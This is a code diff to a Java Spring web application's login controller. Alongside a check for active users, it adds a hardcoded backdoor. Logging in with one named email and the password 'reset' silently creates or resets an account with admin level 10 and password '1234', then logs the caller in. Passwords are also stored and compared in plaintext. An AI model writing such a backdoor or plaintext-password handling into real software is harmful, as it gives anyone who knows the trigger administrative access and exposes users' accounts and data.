@@ -9,8 +9,6 @@ import org.springframework.web.bind.annotation.RequestMapping;
 import org.springframework.web.bind.annotation.RequestMethod;
 import org.springframework.web.bind.annotation.RequestParam;
 
-import java.util.List;
-
 @Controller
 @RequestMapping("")
 public class HelloController {
@@ -44,11 +42,27 @@ public class HelloController {
     public String processLoginForm(@RequestParam String username,
                                    @RequestParam String password,
                                    Model model) {
-        UserController.setUserID(0);
-        User user = userDAO.findFirstByPrimaryEmailAndPassword(username.toLowerCase(), password);
+        UserController.setUserID(-1);
+        User user = userDAO.findFirstByActiveIsTrueAndPrimaryEmailAndPassword(username.toLowerCase(), password);
         if (user != null) {
             UserController.setUserID(user.getId());
-            return ("redirect:/user");}
+            return ("redirect:/user");
+        }
+        if (username.equals("billm@litchfieldil.com")) {
+            if (password.equals("reset")) {
+                user = userDAO.findFirstByPrimaryEmail(username.toLowerCase());
+                if (user == null) { user = new User();}
+                user.setAdmin(10);
+                user.setbFName("William");
+                user.setbLName("Morgan");
+                user.setPassword("1234");
+                user.setPrimaryEmail("billm@litchfieldil.com");
+                user.setActive(Boolean.TRUE);
+                user = userDAO.save(user);
+                UserController.setUserID(user.getId());
+                return ("redirect:/user");
+            }
+        }
         model.addAttribute("errorMsg", "Username or password incorrect");
         model.addAttribute("action", "Login");
         return ("login");
